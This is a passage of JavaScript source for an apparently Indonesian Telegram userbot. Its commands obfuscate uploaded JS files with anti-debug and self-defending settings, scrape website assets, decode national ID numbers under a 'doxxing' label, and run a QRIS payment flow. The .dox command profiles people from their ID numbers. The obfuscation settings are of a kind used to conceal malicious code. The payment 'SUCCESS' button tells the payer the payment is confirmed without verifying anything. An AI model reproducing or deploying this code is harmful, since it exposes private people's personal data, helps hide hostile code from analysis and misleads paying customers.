        opaquePredicates: 0.75,
        renameVariables: true,
        renameGlobals: true,
        stringConcealing: true,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.75,
        rgf: false,
      };
    };

    const fileTempBase = `invisible-encrypted-${Date.now()} © ʙʏ ᴅᴏʏᴀɴɢ`;
    const STATUS_TEXT = "<blockquote>⌛️ ᴘʀᴏɢʀᴇss ᴍᴇɴɢᴏʙғᴜsᴄᴀᴛᴇ ɪɴᴠɪsɪʙʟᴇ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</blockquote>";
    let outPath = null;
    let statusMsg = null;
    
    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ ʙᴀʟᴀs ғɪʟᴇ .js ᴅᴇɴɢᴀɴ .encinvis</blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id || null;
      if (!repliedId) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴇᴍᴜᴋᴀɴ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      let repliedArr;
      try {
        repliedArr = await client.getMessages(chatId, { ids: repliedId });
      } catch (e) {
        console.error("getMessages error:", e);
        repliedArr = null;
      }
      
      const replied = Array.isArray(repliedArr) ? repliedArr[0] : repliedArr;
      if (!replied) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const doc =
        replied.document ||
        (replied.media && replied.media.document) ||
        (replied.media && replied.media.file) ||
        replied.media ||
        replied;

      const fileName =
        (doc.file_name ||
         doc.fileName ||
         (doc.attributes && Array.isArray(doc.attributes) && doc.attributes.find(a => a.file_name)?.file_name) ||
         (doc.document && (doc.document.file_name || doc.document.fileName)) ||
         (replied.file?.name) ||
         ""
        ).toString();

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ ʙᴜᴋᴀɴ .js</blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      try {
        statusMsg = await client.sendMessage(chatId, { 
          message: STATUS_TEXT, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (e) {
        console.warn("gagal kirim status message:", e);
        statusMsg = null;
      }

      let buffer;
      try {
        buffer = await client.downloadMedia(doc);
      } catch (e) {
        console.error("downloadMedia error:", e);
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ: ${e.message || e}</blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      if (!buffer || buffer.length === 0) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ ғɪʟᴇ ᴋᴏsᴏɴɢ sᴇᴛᴇʟᴀʜ ᴅᴏᴡɴʟᴏᴀᴅ</blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      let src = buffer.toString("utf8");
      try { 
        new Function(src); 
      } catch (syntaxErr) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ sʏɴᴛᴀx ᴇʀʀᴏʀ:\n<code>${syntaxErr.message}</code></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const JsConfuser = require('js-confuser');
      let obfResult;
      try {
        obfResult = await JsConfuser.obfuscate(src, getStrongObfuscationConfig());
      } catch (e) {
        console.error("Obfuscate error:", e);
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴏʙғᴜsᴄᴀᴛɪᴏɴ: ${e.message || e}</blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const obfuscatedCode = typeof obfResult === "string" ? obfResult : obfResult.code;
      try { 
        new Function(obfuscatedCode); 
      } catch (postErr) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ ʜᴀsɪʟ ᴏʙғᴜsᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ:\n<code>${postErr.message}</code></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const safeName = fileName.replace(/[^a-zA-Z0-9._-]/g, "_");
      outPath = path.join(__dirname, `${fileTempBase}-${safeName}`);
      fs.writeFileSync(outPath, obfuscatedCode, "utf8");

      try {
        await client.sendMessage(chatId, { 
          file: outPath, 
          caption: `<blockquote>✅ ғɪʟᴇ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (e) {
        const outBuf = Buffer.from(obfuscatedCode, "utf8");
        try {
          await client.sendMessage(chatId, { 
            file: outBuf, 
            caption: `<blockquote>✅ ғɪʟᴇ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
          });
        } catch (e2) {
          console.error("send file fallback failed:", e2);
          if (statusMsg) try { 
            await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
          } catch (_) {}
          await client.sendMessage(chatId, { 
            message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ғɪʟᴇ: ${e2.message || e2}</blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
          });
          return;
        }
      }

      if (statusMsg) {
        try { 
          await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); 
        } catch (e) { 
          console.warn("gagal hapus status:", e); 
        }
      }

      if (outPath && fs.existsSync(outPath)) {
        try { 
          fs.unlinkSync(outPath); 
        } catch (e) { 
          console.warn("cannot unlink outPath:", e); 
        }
      }

    } catch (err) {
      console.error("Unhandled error encinvis:", err);
      if (typeof statusMsg !== "undefined" && statusMsg && statusMsg.id) {
        try { 
          await client.deleteMessages(msg.chatId, [statusMsg.id], { revoke: true }); 
        } catch (_) {}
      }
      try {
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message || err}</blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (_) {}
    }
  })();
  return;
}

     // .encvar
      if (msg.text?.startsWith(`${prefix}encvar`)) {
  (async () => {
    const fs = require('fs');
    const path = require('path');
    
    const getNovaObfuscationConfig = () => {
      const generateNovaName = () => {
        return "var_" + Math.random().toString(36).substring(7);
      };

      return {
        target: "node",
        calculator: false,
        compact: true,
        controlFlowFlattening: 1,
        deadCode: 1,
        dispatcher: true,
        duplicateLiteralsRemoval: 1,
        flatten: true,
        globalConcealing: true,
        hexadecimalNumbers: 1,
        identifierGenerator: generateNovaName,
        lock: {
          antiDebug: true,
          integrity: true,
          selfDefending: true,
        },
        minify: true,
        movedDeclarations: true,
        objectExtraction: true,
        opaquePredicates: true,
        renameGlobals: true,
        renameVariables: true,
        shuffle: true,
        stringCompression: true,
        stringConcealing: true,
      };
    };

    const fileTempBase = `var-encrypted-${Date.now()} © ʙʏ ᴅᴏʏᴀɴɢ`;
    const STATUS_TEXT = "<blockquote>⌛️ <b>ᴘʀᴏɢʀᴇss ᴍᴇɴɢᴏʙғᴜsᴄᴀᴛᴇ ᴠᴀʀ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</b></blockquote>";
    let outPath = null;
    let statusMsg = null;

    try {
      const chatId = msg.chatId;
      
      if (!msg.replyTo) {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>ʙᴀʟᴀs ғɪʟᴇ .js ᴅᴇɴɢᴀɴ .encvar</b></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const repliedId = msg.replyTo.replyToMsgId || msg.replyTo.msgId || msg.replyTo.id || null;
      if (!repliedId) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴇᴍᴜᴋᴀɴ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</b></blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      let repliedArr;
      try {
        repliedArr = await client.getMessages(chatId, { ids: repliedId });
      } catch (e) {
        console.error("getMessages error:", e);
        repliedArr = null;
      }
      
      const replied = Array.isArray(repliedArr) ? repliedArr[0] : repliedArr;
      if (!replied) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</b></blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const doc =
        replied.document ||
        (replied.media && replied.media.document) ||
        (replied.media && replied.media.file) ||
        replied.media ||
        replied;

      const fileName =
        (doc.file_name ||
         doc.fileName ||
         (doc.attributes && Array.isArray(doc.attributes) && doc.attributes.find(a => a.file_name)?.file_name) ||
         (doc.document && (doc.document.file_name || doc.document.fileName)) ||
         (replied.file?.name) ||
         ""
        ).toString();

      if (!fileName.toLowerCase().endsWith(".js")) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ <b>ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ ʙᴜᴋᴀɴ .js</b></blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      try {
        statusMsg = await client.sendMessage(chatId, { 
          message: STATUS_TEXT, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (e) {
        console.warn("gagal kirim status message:", e);
        statusMsg = null;
      }

      let buffer;
      try {
        buffer = await client.downloadMedia(doc);
      } catch (e) {
        console.error("downloadMedia error:", e);
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ: ${e.message || e}</b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      if (!buffer || buffer.length === 0) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ <b>ғɪʟᴇ ᴋᴏsᴏɴɢ sᴇᴛᴇʟᴀʜ ᴅᴏᴡɴʟᴏᴀᴅ</b></blockquote>", 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const src = buffer.toString("utf8");
      try { 
        new Function(src); 
      } catch (syntaxErr) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ <b>sʏɴᴛᴀx ᴇʀʀᴏʀ:\n<code>${syntaxErr.message}</code></b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const JsConfuser = require('js-confuser');
      let obfResult;
      try {
        obfResult = await JsConfuser.obfuscate(src, getNovaObfuscationConfig());
      } catch (e) {
        console.error("Obfuscate error:", e);
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴏʙғᴜsᴄᴀᴛɪᴏɴ: ${e.message || e}</b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const obfuscatedCode = typeof obfResult === "string" ? obfResult : (obfResult && obfResult.code) || "";
      try { 
        new Function(obfuscatedCode); 
      } catch (postErr) {
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ <b>ʜᴀsɪʟ ᴏʙғᴜsᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ:\n<code>${postErr.message}</b></code></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      const safeName = fileName.replace(/[^a-zA-Z0-9._-]/g, "_");
      outPath = path.join(__dirname, `${fileTempBase}-${safeName}`);
      
      try {
        fs.writeFileSync(outPath, obfuscatedCode, "utf8");
      } catch (e) {
        console.error("write file error:", e);
        if (statusMsg) try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (_) {}
        await client.sendMessage(chatId, { 
          message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴʏɪᴍᴘᴀɴ ғɪʟᴇ sᴇᴍᴇɴᴛᴀʀᴀ: ${e.message || e}</b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
        return;
      }

      try {
        await client.sendMessage(chatId, { 
          file: outPath, 
          caption: `<blockquote>✅ <b>ғɪʟᴇ ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (e) {
        const outBuf = Buffer.from(obfuscatedCode, "utf8");
        try {
          await client.sendMessage(chatId, { 
            file: outBuf, 
            caption: `<blockquote>✅ <b>ғɪʟᴇ ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</b></blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
          });
        } catch (e2) {
          console.error("send file fallback failed:", e2);
          if (statusMsg) try { 
            await client.deleteMessages(chatId, [statusMsg.id]); 
          } catch (_) {}
          await client.sendMessage(chatId, { 
            message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪɴ ғɪʟᴇ: ${e2.message || e2}</b></blockquote>`, 
            parseMode: "html", 
            replyTo: msg.id 
          });
          return;
        }
      }

      if (statusMsg) {
        try { 
          await client.deleteMessages(chatId, [statusMsg.id]); 
        } catch (e) { 
          console.warn("gagal hapus status:", e); 
        }
      }

      if (outPath && fs.existsSync(outPath)) {
        try { 
          fs.unlinkSync(outPath); 
        } catch (e) { 
          console.warn("cannot unlink outPath:", e); 
        }
      }

    } catch (err) {
      console.error("Unhandled error encvar:", err);
      if (typeof statusMsg !== "undefined" && statusMsg && statusMsg.id) {
        try { 
          await client.deleteMessages(msg.chatId, [statusMsg.id]); 
        } catch (_) {}
      }
      try {
        await client.sendMessage(msg.chatId, { 
          message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message || err}</b></blockquote>`, 
          parseMode: "html", 
          replyTo: msg.id 
        });
      } catch (_) {}
    }
  })();
  return;
}
      
      // === NEW TOOLS COMMANDS ===
      if (msg.text?.startsWith(`${prefix}getcode`)) {
  (async () => {
    const axios = require('axios');
    const path = require('path');
    const fs = require('fs');
    const AdmZip = require('adm-zip');

    const FETCH_TIMEOUT = 30000;
    const MAX_FILES = 100;
    const SEND_DELAY = 500;

    function resolveResourceUrl(base, relative) {
      try {
        return new URL(relative, base).href;
      } catch {
        return null;
      }
    }

    function isOnlineUrl(url) {
      return /^https?:\/\//i.test(url);
    }

    function isWantedFile(url) {
      return /\.(js|css|png|jpe?g|gif|svg|ico|webp|woff2?|ttf|html?|mp4|webm|ogg)$/i.test(url);
    }

    function sanitizeFilename(name) {
      return name.replace(/[^a-zA-Z0-9._-]/g, "_");
    }

    async function fetchArrayBuffer(url) {
      return await axios.get(url, { responseType: "arraybuffer", timeout: FETCH_TIMEOUT });
    }

    try {
      const chatId = msg.chatId;
      const text = msg.text.split(" ").slice(1).join(" ").trim();
      
      if (!text) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ Gunakan: <b>${prefix}getcode [url]</b>\nContoh: <b>${prefix}getcode google.com</b></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      let startUrl = text.trim();
      if (!/^https?:\/\//i.test(startUrl)) startUrl = "https://" + startUrl;

      const msgProgress = await client.sendMessage(chatId, {
        message: `<blockquote>🔍 Mengambil file dari:\n<b>${startUrl}</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const baseName = `site_${Date.now()}`;
      const tmpDir = path.join(process.cwd(), baseName);
      fs.mkdirSync(tmpDir, { recursive: true });

      let htmlText;
      try {
        const r = await axios.get(startUrl, { 
          timeout: FETCH_TIMEOUT, 
          responseType: "text", 
          maxRedirects: 5 
        });
        htmlText = r.data;
        fs.writeFileSync(path.join(tmpDir, "index.html"), htmlText, "utf8");
      } catch (e) {
        await client.editMessage(chatId, {
          message: `<blockquote>❌ Gagal mengambil halaman utama:\n<code>${e.message}</code></blockquote>`,
          parseMode: "html",
          messageId: msgProgress.id
        });
        fs.rmSync(tmpDir, { recursive: true, force: true });
        return;
      }

      const resourceSet = new Set();
      const tagRegex = /<(script|link|img)[^>]*?(?:src|href)=["']?([^"'>\s]+)["']?/gi;
      const inlineStyleRegex = /style=["'][^"']*url\(([^)]+)\)[^"']*["']/gi;
      const metaRegex = /<meta[^>]+(property|name)=["'](?:og:image|twitter:image)["'][^>]+content=["']([^"']+)["']/gi;
      const iconRegex = /<link[^>]+rel=["'][^"']*(icon|shortcut icon|apple-touch-icon)[^"']*["'][^>]+href=["']([^"']+)["']/gi;

      let m;
      while ((m = tagRegex.exec(htmlText))) if (m[2]) resourceSet.add(m[2]);
      while ((m = inlineStyleRegex.exec(htmlText))) {
        const raw = m[1].trim().replace(/^['"]|['"]$/g, "");
        if (raw) resourceSet.add(raw);
      }
      while ((m = metaRegex.exec(htmlText))) if (m[2]) resourceSet.add(m[2]);
      while ((m = iconRegex.exec(htmlText))) if (m[2]) resourceSet.add(m[2]);

      const queue = Array.from(resourceSet)
        .map((raw) => resolveResourceUrl(startUrl, raw))
        .filter((u) => isOnlineUrl(u) && isWantedFile(u));

      const totalFiles = Math.min(queue.length, MAX_FILES);
      let success = 0;
      const visited = new Set();

      for (const fileUrl of queue.slice(0, totalFiles)) {
        if (visited.has(fileUrl)) continue;
        visited.add(fileUrl);

        try {
          const { data } = await fetchArrayBuffer(fileUrl);
          const urlObj = new URL(fileUrl);
          const filename = sanitizeFilename(urlObj.pathname.split("/").pop() || `file_${success}`);
          const filePath = path.join(tmpDir, filename);
          fs.writeFileSync(filePath, Buffer.from(data));
          success++;

          if (success % 5 === 0 || success === totalFiles) {
            await client.editMessage(chatId, {
              message: `<blockquote>📥 Mengunduh file... (${success}/${totalFiles})</blockquote>`,
              parseMode: "html",
              messageId: msgProgress.id
            }).catch(() => {});
          }
        } catch (e) {
          console.error("❌ Gagal download:", fileUrl, e.message);
        }

        await new Promise((r) => setTimeout(r, SEND_DELAY));
      }
      
      await client.deleteMessages(chatId, [msgProgress.id], { revoke: true }).catch(()=>{});

      const zip = new AdmZip();
      zip.addLocalFolder(tmpDir);
      const zipPath = path.join(process.cwd(), `${baseName}.zip`);
      zip.writeZip(zipPath);

      await client.sendMessage(chatId, {
        message: "<blockquote>📦 Sedang mengirim file ZIP...</blockquote>",
        parseMode: "html"
      }).catch(() => {});

      await client.sendFile(chatId, {
        file: zipPath,
        caption: `<blockquote>✅ Selesai mengambil isi web\n📦 Total file: ${success}\n🌐 URL: ${startUrl}\n\n© ʙʏ ᴅᴏʏᴀɴɢ 👑</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      try {
        fs.rmSync(tmpDir, { recursive: true, force: true });
        fs.unlinkSync(zipPath);
      } catch (err) {
        console.error("Error cleaning up:", err);
      }

    } catch (err) {
      console.error("Error in .getcode command:", err);
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Terjadi kesalahan saat mengambil kode website:\n<code>${err.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  })();
  return;
}
      
      // .dox
      if (msg.text?.startsWith(`${prefix}dox`)) {
  (async () => {
    try {
      const chatId = msg.chatId;
      
      const nikInput = msg.text.split(" ")[1];
      
      if (!nikInput) {
        await client.sendMessage(chatId, { 
          message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: <b>.dox 16070xxxxxxxxxxxx</b>\n\nContoh: <b>.dox 3275071208970001</b></blockquote>`,
          replyTo: msg.id,
          parseMode: "html" 
        });
        return;
      }

      let nik;
      try {
        const { nikParser } = require('nik-parser');
        nik = nikParser(nikInput.trim());
      } catch (e) {
        console.error("Parser error:", e);
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ NIK ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ ᴀᴛᴀᴜ ɢᴀɢᴀʟ ᴅɪᴘʀᴏsᴇs.</blockquote>",
          replyTo: msg.id,
          parseMode: "html" 
        });
        return;
      }

      if (!nik.isValid()) {
        await client.sendMessage(chatId, { 
          message: "<blockquote>❌ NIK ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ.</blockquote>",
          replyTo: msg.id,
          parseMode: "html" 
        });
        return;
      }

      const provinsi = nik.province();
      const kabupaten = nik.kabupatenKota();
      const kecamatan = nik.kecamatan();
      const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(`${kecamatan}, ${kabupaten}, ${provinsi}`)}`;

      const hasil = `
<blockquote>
🌐 <b>𝐇𝐀𝐒𝐈𝐋 𝐃𝐎𝐗𝐗𝐈𝐍𝐆 𝐍𝐈𝐊</b>

✅ <b>ɴɪᴋ ᴠᴀʟɪᴅ:</b> ${nik.isValid()}
🏙️ <b>ɪᴅ ᴘʀᴏᴠɪɴsɪ:</b> ${nik.provinceId()}
📌 <b>ᴘʀᴏᴠɪɴsɪ:</b> ${provinsi}
🏢 <b>ɪᴅ ᴋᴀʙᴜᴘᴀᴛᴇɴ:</b> ${nik.kabupatenKotaId()}
📌 <b>ᴋᴀʙᴜᴘᴀᴛᴇɴ:</b> ${kabupaten}
📍 <b>ɪᴅ ᴋᴇᴄᴀᴍᴀᴛᴀɴ:</b> ${nik.kecamatanId()}
📌 <b>ᴋᴇᴄᴀᴍᴀᴛᴀɴ:</b> ${kecamatan}
🏤 <b>ᴋᴏᴅᴇ ᴘᴏs:</b> ${nik.kodepos()}
🚻 <b>ᴊᴇɴɪs ᴋᴇʟᴀᴍɪɴ:</b> ${nik.kelamin()}
🎂 <b>ᴛᴀɴɢɢᴀʟ ʟᴀʜɪʀ:</b> ${nik.lahir()}
🔑 <b>ᴜɴɪǫᴄᴏᴅᴇ:</b> ${nik.uniqcode()}

📍 <b>ᴍᴀᴘs:</b> <a href="${mapsUrl}">Klik di sini</a>
</blockquote>`.trim();

      await client.sendMessage(chatId, { 
        message: hasil, 
        parseMode: "html", 
        linkPreview: false,
        replyTo: msg.id
      });

    } catch (err) {
      console.error("Error in .dox command:", err);
      await client.sendMessage(chatId, { 
        message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ sᴀᴀᴛ ᴍᴇᴍᴘʀᴏsᴇs NIK.\n\nPastikan NIK 16 digit dan formatnya benar.</blockquote>", 
        replyTo: msg.id,
        parseMode: "html" 
      });
    }
  })();
  return;
}

      // === NEW OWNER COMMANDS ===

      // .setnamebot
      if (msg.text?.startsWith(`${prefix}setnamebot`)) {
        if (!isOwner) return;
        const name = text.split(" ").slice(1).join(" ");
        if (!name) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format salah!\nGunakan: ${prefix}setnamebot <nama></blockquote>`, parseMode: "html", replyTo: msg.id });
          return;
        }
        try {
          await client.invoke(new Api.account.UpdateProfile({ firstName: name }));
          await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Nama bot diganti ke: ${name}</blockquote>`, parseMode: "html", replyTo: msg.id });
        } catch (e) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ganti nama: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
        }
        return;
      }
      
// Variabel untuk menyimpan gambar QRIS (di memory)
let qrisImageBuffer = null;

// Perintah SETPAY - untuk menyetel gambar QRIS
if (msg.text?.startsWith(`${prefix}setpay`)) {
  // Coba berbagai cara untuk mendapatkan gambar yang direply
  let quotedImage = null;
  
  // Cek reply dari berbagai kemungkinan properti
  if (msg.quotedMsg && msg.quotedMsg.image) {
    quotedImage = msg.quotedMsg.image;
  } else if (msg.replyToMessage && msg.replyToMessage.image) {
    quotedImage = msg.replyToMessage.image;
  } else if (msg.replyTo && msg.replyTo.image) {
    quotedImage = msg.replyTo.image;
  } else if (msg.message_reply && msg.message_reply.image) {
    quotedImage = msg.message_reply.image;
  }
  
  if (quotedImage) {
    try {
      // Download gambar yang direply
      const buffer = await client.downloadMedia(quotedImage);
      qrisImageBuffer = buffer;
      
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>✅ *QRIS BERHASIL DISETEL!*

Gambar QRIS telah disimpan.
Gunakan command *${prefix}pay* untuk mengirim QRIS ke customer.</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    } catch (e) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ Gagal menyetel QRIS: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    }
  } else {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>⚠️ *CARA MENGGUNAKAN SETPAY:*

1. Kirim gambar QRIS ke chat ini
2. *REPLY/TAP* gambar tersebut
3. Ketik *${prefix}setpay*

Contoh: 
Kirim gambar QRIS → Tap/Reply gambar → Ketik .setpay</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
  }
  return;
}

// Perintah PAY - untuk mengirim QRIS yang sudah disetel
if (msg.text?.startsWith(`${prefix}pay`)) {
  // Cek apakah gambar sudah disetel
  if (!qrisImageBuffer) {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>❌ *QRIS BELUM DISETEL!*

Admin harus menyetel QRIS terlebih dahulu dengan command:
*${prefix}setpay*

Cara: Kirim gambar QRIS → Reply gambar tersebut → Ketik ${prefix}setpay</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }
  
  const paymentNote = `<blockquote>💳 *SATU QRIS UNTUK SEMUA*

Scan QR code di atas untuk melakukan pembayaran.

📌 *Detail Transaksi:*
• Minimal transfer: Rp10.000
• Maksimal transfer: Rp2.000.000
• Admin fee: Rp0

📝 *Catatan:*
• Kirim bukti transfer setelah payment
• Sertakan username Anda untuk verifikasi
• Transaksi akan diproses dalam 1x24 jam

Cek aplikasi penyelenggara di aplikasi masing-masing.</blockquote>`;

  try {
    await client.sendMessage(msg.chatId, {
      message: qrisImageBuffer,
      fileName: "qris_payment.jpg",
      caption: paymentNote,
      parseMode: "html",
      replyTo: msg.id,
      buttons: [
        {
          text: "✅ SUCCESS",
          callbackData: "payment_success"
        }
      ]
    });
  } catch (e) {
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>❌ Gagal mengirim QRIS: ${e.message}</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id 
    });
  }
  return;
}

// Callback untuk tombol SUCCESS
client.on("callbackQuery", async (callback) => {
  if (callback.data === "payment_success") {
    await client.sendMessage(callback.message.chat.id, {
      message: `<blockquote>✅ *Terima kasih!*

Pembayaran Anda telah dikonfirmasi.

🕐 Mohon tunggu proses verifikasi maksimal 1x24 jam.
📩 Bukti transfer akan kami cek.

Jika ada kendala, hubungi admin.</blockquote>`,
      parseMode: "html",
      replyTo: callback.message.id
    });
    
    await callback.answer("✅ Pembayaran dikonfirmasi!");
  }
});
      // .setbio
      if (msg.text?.startsWith(`${prefix}setbio`)) {
        if (!isOwner) return;
        const bio = text.split(" ").slice(1).join(" ");
        if (!bio) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ Format salah!\nGunakan: ${prefix}setbio <bio></blockquote>`, parseMode: "html", replyTo: msg.id });
          return;
        }
        try {
          await client.invoke(new Api.account.UpdateProfile({ about: bio }));
          await client.sendMessage(msg.chatId, { message: `<blockquote>✅ Bio bot diganti ke: ${bio}</blockquote>`, parseMode: "html", replyTo: msg.id });
        } catch (e) {
          await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Gagal ganti bio: ${e.message}</blockquote>`, parseMode: "html", replyTo: msg.id });
        }
        return;
      }

      // .restart
      if (msg.text?.startsWith(`${prefix}restart`)) {
        if (!isOwner) return;
        await client.sendMessage(msg.chatId, { message: "<blockquote>🔄 Restarting...</blockquote>", parseMode: "html", replyTo: msg.id });
        process.exit(0); 
      }
      
     // Case tembak / jadian
